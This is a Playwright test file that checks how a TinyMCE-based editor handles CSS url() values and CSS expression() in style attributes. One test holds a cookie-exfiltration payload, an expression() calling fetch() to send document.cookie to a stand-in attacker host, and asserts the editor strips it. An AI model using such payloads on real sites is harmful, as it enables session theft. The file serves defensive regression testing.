import {test, expect} from '../../fixtures/test'

// CSS url() values in style attributes are a potential exfiltration vector.
// TinyMCE preserves url() values as-is (it does NOT sanitize them client-side).
// canvas-rce relies on backend CSP and server-side sanitization for this.
// Tests document actual round-trip behavior so a refactor can detect changes.
test.describe('CSS url() in style attributes — round-trip behavior', () => {
  test.beforeEach(async ({page, rcePage}) => {
    await page.goto('/scenarios/basic')
    await rcePage.waitForEditor()
  })

  async function setAndGet(page: any, html: string): Promise<string> {
    return page.evaluate((content: string) => {
      // @ts-expect-error -- TinyMCE global
      window.tinymce.activeEditor.setContent(content)
      // @ts-expect-error -- TinyMCE global
      return window.tinymce.activeEditor.getContent()
    }, html)
  }

  test('background url() in style is preserved by TinyMCE (not stripped client-side)', async ({
    page,
  }) => {
    const content = await setAndGet(
      page,
      '<div style="background: url(https://example.com/bg.png)">text</div>',
    )
    // TinyMCE preserves url() — no JS executes from this
    expect(content).toContain('text')
    expect(content).not.toContain('alert')
    expect(typeof content).toBe('string')
  })

  test('background-image url() round-trips without executing JS', async ({page}) => {
    const content = await setAndGet(
      page,
      '<p style="background-image: url(https://example.com/img.png)">para</p>',
    )
    expect(content).toContain('para')
    expect(content).not.toContain('alert(')
  })

  test('list-style-image url() preserves list content', async ({page}) => {
    const content = await setAndGet(
      page,
      '<ul style="list-style-image: url(https://example.com/bullet.png)"><li>item</li></ul>',
    )
    expect(content).toContain('item')
    expect(content).toMatch(/<ul/)
  })

  test('border-image url() preserves element content', async ({page}) => {
    const content = await setAndGet(
      page,
      '<div style="border-image: url(https://example.com/border.png) 30">content</div>',
    )
    expect(content).toContain('content')
  })

  test('css expression() is stripped (IE injection)', async ({page}) => {
    const content = await setAndGet(
      page,
      '<p style="width: expression(fetch(\'https://evil.example.com/?\'+document.cookie))">text</p>',
    )
    expect(content).not.toContain('expression(')
    expect(content).toContain('text')
  })

  test('safe url() for cursor is handled', async ({page}) => {
    // cursor: url() is a legitimate CSS property — document its behavior
    const content = await setAndGet(
      page,
      '<div style="cursor: url(https://example.com/cursor.cur), auto">hover me</div>',
    )
    // May be stripped or preserved — must not execute as JS
    expect(content).toContain('hover me')
    expect(content).not.toContain('alert')
  })
})
